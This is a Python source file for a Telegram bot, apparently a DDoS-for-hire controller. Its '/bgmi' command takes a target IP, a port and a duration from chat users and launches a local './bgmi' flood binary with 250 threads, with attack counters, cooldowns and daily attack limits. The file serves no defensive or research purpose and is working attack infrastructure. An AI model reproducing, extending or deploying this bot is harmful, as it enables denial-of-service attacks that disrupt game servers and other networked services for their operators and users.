import os
import telebot
import subprocess
import threading
from datetime import datetime, timedelta
from flask import Flask, request

# ========== CONFIG ==========
TOKEN = os.environ.get("TOKEN")
ADMIN_IDS = [1924991786, 5071105651]

if not TOKEN:
    print("❌ TOKEN missing!")
    exit()

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ========== GLOBAL ==========
user_attacks = {}
user_cooldowns = {}
active_attacks = 0
attack_lock = threading.Lock()

thread_count = 250
COOLDOWN_DURATION = 30
DAILY_ATTACK_LIMIT = 50
MAX_ACTIVE_ATTACKS = 3

# ========== HELPERS ==========
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "✅ Bot working!")

@bot.message_handler(commands=['status'])
def status(msg):
    bot.reply_to(msg, f"Active: {active_attacks}")

@bot.message_handler(commands=['bgmi'])
def bgmi(msg):
    global active_attacks

    try:
        args = msg.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(msg, "Usage: /bgmi ip port time")
            return

        ip, port, duration = args

        if not is_valid_ip(ip):
            bot.reply_to(msg, "Invalid IP")
            return

        duration = int(duration)

        active_attacks += 1
        bot.reply_to(msg, f"Started {ip}:{port}")

        def run():
            global active_attacks
            try:
                if not os.path.exists("./bgmi"):
                    bot.send_message(msg.chat.id, "Binary missing")
                    return

                subprocess.run(
                    ["./bgmi", ip, port, str(duration), str(thread_count)],
                    timeout=duration + 5
                )

                bot.send_message(msg.chat.id, "Done")

            except Exception as e:
                bot.send_message(msg.chat.id, f"Error: {e}")

            finally:
                active_attacks = max(0, active_attacks - 1)

        threading.Thread(target=run).start()

    except Exception as e:
        bot.reply_to(msg, f"Error: {e}")

# ========== WEBHOOK FIX ==========
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    try:
        data = request.get_data().decode("utf-8")
        print("DATA:", data)

        update = telebot.types.Update.de_json(data)
        bot.process_new_updates([update])

        return "ok", 200

    except Exception as e:
        print("ERROR:", e)
        return "ok", 200   # ❗ 502 fix

@app.route("/")
def home():
    return "RUNNING"

# ========== START ==========
if __name__ == "__main__":
    print("🚀 BOT STARTED")

    # 👉 webhook auto set
    url = os.environ.get("RAILWAY_STATIC_URL")

    if url:
        try:
            bot.remove_webhook()
            bot.set_webhook(url=f"{url}/{TOKEN}")
            print("✅ Webhook set:", f"{url}/{TOKEN}")
        except Exception as e:
            print("Webhook error:", e)

    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)